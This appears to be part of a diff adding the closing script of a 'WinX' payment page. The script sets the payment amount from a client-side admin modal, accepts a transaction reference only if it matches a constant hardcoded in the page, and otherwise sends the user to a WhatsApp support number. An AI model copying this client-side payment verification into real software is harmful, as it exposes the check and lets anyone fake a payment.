+                localStorage.setItem('winx_payment_amount', newAmt);
+                applyAmount(newAmt);
+            }
+            adminModal.classList.add('hidden');
+        });
+
+        // Verify transaction reference ID
+        verifyForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            AudioFX.playTap();
+
+            const typedRef = referenceInput.value.trim();
+            const correctRef = '89984887780';
+
+            if (typedRef === correctRef) {
+                AudioFX.playSuccess();
+                successEmail.textContent = state.email;
+                successPhone.textContent = state.phone;
+                whatsappSupportCard.classList.add('hidden');
+                switchView('step3');
+            } else {
+                AudioFX.playError();
+                failedIdDisplay.textContent = typedRef || '(Empty Entry)';
+                const msg = encodeURIComponent(`Hello WinX Support, I attempted verification with transaction ID ${typedRef} and need assistance.`);
+                whatsappBtn.href = `https://wa.me/233503829895?text=${msg}`;
+                whatsappSupportCard.classList.remove('hidden');
+                whatsappSupportCard.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }
+        });
+
+        resetAppBtn.addEventListener('click', () => {
+            AudioFX.playTap();
+            contactForm.reset();
+            verifyForm.reset();
+            whatsappSupportCard.classList.add('hidden');
+            state.email = '';
+            state.phone = '';
+            switchView('intro');
+        });
+    </script>
+</body>
+</html>
